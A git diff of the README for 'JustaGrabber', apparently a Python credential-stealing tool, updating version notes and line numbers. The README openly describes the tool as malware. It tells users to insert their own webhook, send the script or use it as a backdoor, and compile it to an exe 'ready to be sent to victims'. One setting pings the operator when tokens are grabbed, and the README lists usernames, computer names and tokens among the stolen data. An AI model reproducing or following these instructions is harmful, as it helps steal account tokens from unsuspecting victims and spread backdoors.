@@ -13,9 +13,9 @@
 
 ---
 
-#### 💗 New Features v.1.2
- - Added embed
- - Up to 22 Browsers and Clients
+#### 💗 New Features v.1.3
+ - Updated some bugs
+ - Is the last version of justagrabber
  
 #### 🎁 Things will send to you when it grabs someting :
  -  Username, Computer name
@@ -34,7 +34,7 @@ Just need python 3's internal module! (os, re, json, urllib.request)
 ### 📁・ How to use
 1. Download python 3 at [python.org](https://python.org). Must be 3.x.x
 2. Open "JustaGrabber.py" with any code editor.
-3. Replace Your webhook in line 3
+3. Replace Your webhook in line 15
 4. Send the code or use as backdoor. Or convert to exe then give to others
 
 ### ⚙・How to compile .py to .exe
@@ -48,9 +48,9 @@ replace JustaGrabber.py to your file name.
 go into the dist folder and there is your exe ready to be sent to victims!
 
 ### 💾・ Settings
-If you open JustaGrabber.py you will se some settings in line 6,7
+If you open JustaGrabber.py you will se some settings in line 18,19
 
 |    JustaGrabber Settings 		|
 | ------------------------------------ 	|
-| `Ping_me` in line 6 : if true, webhook will ping you when grabs tokens (@everyone)	|
-| `Blacklist` in line 7	: list of blacklisted players. You can add,remove. But the name is name of pc.|
+| `Ping_me` in line 18 : if true, webhook will ping you when grabs tokens (@everyone)	|
+| `Blacklist` in line 19 : list of blacklisted players. You can add,remove. But the name is name of pc.|
